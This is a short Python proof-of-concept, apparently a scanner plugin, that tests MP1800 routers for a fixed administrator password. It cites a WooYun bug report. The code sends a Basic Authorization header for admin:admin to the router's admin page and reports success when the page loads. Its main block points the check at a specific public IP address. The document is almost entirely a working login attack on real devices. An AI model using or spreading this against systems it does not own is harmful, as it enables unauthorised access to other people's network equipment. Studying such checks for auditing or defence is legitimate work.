#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  MP1800多业务路由器及信息通信网关 固定密码
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0129025



"""
import urlparse
import time

def assign(service, arg):
    if service == 'mpsec':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = "advance/index.htm"
    url = arg + payload
    header = "Authorization: Basic YWRtaW46YWRtaW4="
    code, head, res, errcode, _ = curl.curl2(url ,header = header )
    if code == 200 and 'RES_BUTTON_EXIT' in res:
        security_hole(url + "  admin:admin")




if __name__ == '__main__':
    from dummy import *
    audit(assign('mpsec', 'http://36.250.159.41/')[1])